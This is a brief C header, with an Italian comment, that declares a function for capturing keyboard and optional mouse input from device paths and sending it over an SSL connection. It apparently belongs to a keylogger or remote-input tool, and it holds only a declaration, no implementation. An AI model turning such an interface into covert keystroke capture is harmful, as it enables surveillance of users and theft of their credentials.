#ifndef CAPTURER_H
#define CAPTURER_H
#include <openssl/ssl.h>

// kb_path: obbligatorio, mouse_path: opzionale (può essere NULL)
void start_capture_loop(const char *kb_path, const char *mouse_path, SSL *ssl);

#endif
